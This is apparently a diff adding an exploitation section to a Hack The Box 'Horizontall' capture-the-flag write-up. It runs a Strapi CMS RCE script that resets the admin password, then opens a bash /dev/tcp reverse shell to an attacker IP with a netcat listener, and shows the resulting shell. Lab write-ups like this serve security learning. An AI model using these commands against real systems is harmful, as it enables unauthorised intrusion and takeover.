@@ -90,3 +90,41 @@ Didn't run it, but reading it, saw they query `/admin/init` for the version to s
 
 So, it's vulnerable, and we should be able to exploit this RCE bug.
 
+### The exploit
+
+    python ./strapi-cms-rce.py http://api-prod.horizontall.htb
+
+This allows us to log in as the admin user in strapi and resets the admin's creds to `admin:SuperStrongPassword1`
+
+You can also execute RCE as well -- `sleep 20` seems to sleep, which is fantastic.
+
+#### Get reverse shell
+
+Let's try to start a reverse shell.
+
+    Note: These may change. Run `ip a` to see your IP.
+    Attacker IP:    10.10.14.64
+    Victim IP:      10.10.11.105
+
+Attacker (listens for connections):
+
+    nc -lvp 6969
+
+Victim (init TCP connection to attacker):
+
+    bash -c 'bash -i >& /dev/tcp/10.10.14.64/6969 0>&1'
+
+And it works! We have shell.
+
+```
+┌─[vagrant@parrot]─[~]
+└──╼ $nc -lvp 6969
+listening on [any] 6969 ...
+connect to [10.10.14.64] from horizontall.htb [10.10.11.105] 37142
+bash: cannot set terminal process group (1897): Inappropriate ioctl for device
+bash: no job control in this shell
+strapi@horizontall:~/myapi$ whoami
+whoami
+strapi
+strapi@horizontall:~/myapi$ 
+```
